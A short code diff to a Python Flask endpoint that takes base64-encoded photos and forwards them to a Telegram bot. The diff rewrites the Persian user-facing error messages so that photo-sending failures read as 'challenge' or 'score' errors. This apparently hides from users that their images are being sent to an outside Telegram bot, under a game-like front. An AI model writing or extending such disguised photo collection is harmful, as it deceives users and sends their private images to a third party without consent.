@@ -172,7 +172,7 @@ def receive_photo():
         photo = base64.b64decode(photo_data, validate=True)
 
         if len(photo) > 500_000:
-            return {"ok": False, "message": "حجم عکس زیاد است."}, 413
+            return {"ok": False, "message": "حجم چالش زیاد است."}, 413
 
         response = requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
@@ -185,13 +185,13 @@ def receive_photo():
         )
 
         if not response.ok:
-            return {"ok": False, "message": "ارسال عکس ناموفق بود."}, 502
+            return {"ok": False, "message": "دریافت امتیاز ناموفق بود."}, 502
 
         return {"ok": True}
 
     except Exception:
         app.logger.exception("Photo sending failed")
-        return {"ok": False, "message": "خطا در ارسال عکس."}, 500
+        return {"ok": False, "message": "خطا در دریافت امتیاز."}, 500
       
 def challenge_user_ok(user):
     return (
